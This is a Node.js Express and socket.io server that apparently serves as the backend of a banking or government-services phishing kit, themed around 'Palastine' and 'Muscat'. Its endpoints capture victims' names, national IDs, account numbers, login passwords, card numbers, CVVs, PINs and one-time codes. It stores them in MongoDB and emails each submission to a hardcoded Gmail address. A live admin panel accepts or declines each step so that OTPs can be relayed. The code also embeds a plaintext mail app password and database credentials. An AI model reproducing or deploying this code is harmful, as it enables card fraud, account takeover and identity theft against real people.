const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors());
app.use(require("morgan")("dev"));

const emailData = {
  user: "pnusds269@gmail.com",
  pass: "ekmv kiij lgyb mgau",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "form"
          ? "Palastine Data"
          : type === "visa"
          ? " Palastine visa"
          : type === "username"
          ? "Palastine login"
          : type === "userOtp"
          ? "Palastine login Otp"
          : "Palastine Otp "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.post("/form", async (req, res) => {
  const data = req.body;
  const order = new Order({
    fullName: data.fullName,
    email: data.email,
    accountNumber: data.accountNumber,
    nationalId: data.nationalId,
    phone: data.phone,
  });
  await order.save();
  await sendEmail(data, "form").then(() => res.status(201).json(order));
});

app.post("/username/:id", async (req, res) => {
  const { id } = req.params;
  const user = await Order.findById(id);
  if (user) {
    user.username = req.body.username;
    user.password = req.body.password;
    await user
      .save()
      .then(async (order) => await sendEmail(req.body, "username"))
      .then(() => res.sendStatus(200));
  }
});
app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  const user = await Order.findById(id);
  if (user) {
    user.cardNumber = req.body.cardNumber;
    user.expiryDate = req.body.expiryDate;
    user.pin = req.body.pin;
    user.cvv = req.body.cvv;
    user.card_name = req.body.card_name;
    user.money = req.body.money;
    await user
      .save()
      .then(async (order) => await sendEmail(req.body, "visa"))
      .then(() => res.sendStatus(200));
  }
});

app.post("/otp/:id", async (req, res) => {
  const { id } = req.params;
  const user = await Order.findById(id);
  if (user) {
    user.otp = req.body.otp;
    await user
      .save()
      .then(async (order) => await sendEmail(req.body, "otp"))
      .then(() => res.sendStatus(200));
  }
});
app.post("/userOtp/:id", async (req, res) => {
  const { id } = req.params;
  const user = await Order.findById(id);
  if (user) {
    user.userOtp = req.body.userOtp;
    await user
      .save()
      .then(async (order) => await sendEmail(req.body, "userOtp"))
      .then(() => res.sendStatus(200));
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.delete("/orders", async (req, res) => {
  await Order.find({}).then(
    async (orders) =>
      await Promise.all(
        orders.map(async (order) => await Order.findByIdAndDelete(order._id))
      ).then(() => res.sendStatus(200))
  );
});

io.on("connection", (socket) => {
  console.log("connected");

  socket.on("form", async (data) => {
    console.log("new form data", data);
    const order = await Order.findByIdAndUpdate(data.id, {
      checked: false,
    });
    io.emit("form", data);
  });

  socket.on("visa", async (data) => {
    console.log("new visa data", data);
    const order = await Order.findByIdAndUpdate(data.id, {
      visaAccept: false,
      checked: false,
      cardNumber: data.cardNumber,
      expiryDate: data.expiryDate,
      card_name: data.card_name,
      cvv: data.cvv,
      pin: data.pin,
      money: data.money,
    });
    io.emit("visa", data);
  });

  socket.on("username", async (data) => {
    console.log("new username data", data);
    await Order.findByIdAndUpdate(data.id, {
      userAccept: false,
      checked: false,
      username: data.username,
      password: data.password,
    }).then((res) => {
      console.log(res)
      io.emit("username", data);
    });
  });

  socket.on("otp", async (data) => {
    console.log("new visa otp data", data);
    const order = await Order.findByIdAndUpdate(data.id, {
      otpAccept: false,
      checked: false,
      otp: data.otp,
    });
    io.emit("otp", data);
  });

  socket.on("userOtp", async (data) => {
    console.log("new userOtp  data", data);
    const order = await Order.findByIdAndUpdate(data.id, {
      userOtpAccept: false,
      checked: false,
      userOtp: data.userOtp,
    });
    io.emit("userOtp", data);
  });

  socket.on("acceptUser", async (data) => {
    console.log("acceptUser From Admin", data);
    console.log(data);
    await Order.findByIdAndUpdate(data._id, {
      userAccept: true,
    });
    io.emit("acceptUser", data);
  });
  socket.on("declineUser", async (data) => {
    console.log("declineBank Form Admin", data);
    await Order.findByIdAndUpdate(data._id, {
      userAccept: true,
    });
    io.emit("declineUser", data);
  });
  socket.on("acceptUserOtp", async (data) => {
    console.log("acceptUserOtp From Admin", data);
    await Order.findByIdAndUpdate(data._id, { userOtpAccept: true });
    io.emit("acceptUserOtp", data);
  });
  socket.on("declineUserOtp", async (data) => {
    console.log("declineUserOtp Form Admin", data);
    await Order.findByIdAndUpdate(data._id, {
      userOtp: "",
      userOtpAccept: true,
    });
    io.emit("declineUserOtp", data);
  });

  socket.on("acceptMuscat", async (data) => {
    console.log("acceptMuscat From Admin", data);
    console.log(data);
    await Order.findByIdAndUpdate(data._id, {
      muscatAccept: true,
    });
    io.emit("acceptMuscat", data);
  });
  socket.on("declineMuscat", async (data) => {
    console.log("declineMuscat Form Admin", data);
    await Order.findByIdAndUpdate(data._id, {
      acceptMuscat: true,
    });
    io.emit("declineMuscat", data);
  });

  socket.on("acceptMuscatOtp", async (data) => {
    console.log("acceptMuscatOtp From Admin", data);
    await Order.findByIdAndUpdate(data._id, { muscatOtpAccept: true });
    io.emit("acceptMuscatOtp", data);
  });
  socket.on("declineMuscatOtp", async (data) => {
    console.log("declineMuscatOtp Form Admin", data);
    await Order.findByIdAndUpdate(data._id, {
      bankOtp: "",
      muscatOtpAccept: true,
    });
    io.emit("declineMuscatOtp", data);
  });

  socket.on("acceptVisa", async (data) => {
    console.log("acceptVisa From Admin", data);
    await Order.findByIdAndUpdate(data._id, { visaAccept: true });
    io.emit("acceptVisa", data);
  });
  socket.on("declineVisa", async (data) => {
    console.log("declineVisa Form Admin", data);
    await Order.findByIdAndUpdate(data._id, {
      visaAccept: true,
    });
    io.emit("declineVisa", data);
  });

  socket.on("acceptOtp", async (data) => {
    console.log("acceptOtp From Admin", data);
    await Order.findByIdAndUpdate(data._id, { otpAccept: true });
    io.emit("acceptOtp", data);
  });
  socket.on("declineOtp", async (data) => {
    console.log("declineOtp Form Admin", data);
    await Order.findByIdAndUpdate(data._id, { otp: "", otpAccept: true });
    io.emit("declineOtp", data);
  });
});

mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/Palastine")
  .then((conn) =>
    server.listen(PORT, async () => {
      console.log("server running and connected to db" + conn.connection.host);
      // await Order.find({}).then(async(orders)=>await Promise.all(orders.map(async(order)=>await Order.findByIdAndDelete(order._id))))
    })
  );
